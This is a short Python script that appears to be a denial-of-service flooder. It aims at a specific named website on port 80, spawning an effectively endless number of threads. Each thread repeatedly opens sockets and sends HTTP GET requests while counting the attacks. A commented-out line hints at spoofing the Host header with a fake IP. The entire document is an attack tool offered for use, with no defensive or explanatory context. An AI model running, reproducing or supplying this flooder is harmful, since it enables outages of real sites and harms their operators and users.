import socket
import threading

attack_num = 0
target = 'lekkishootingfacts.com'
port = 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        # s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()

if __name__ == '__main__':
    for i in range(999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
        thread = threading.Thread(target=attack)
        thread.start()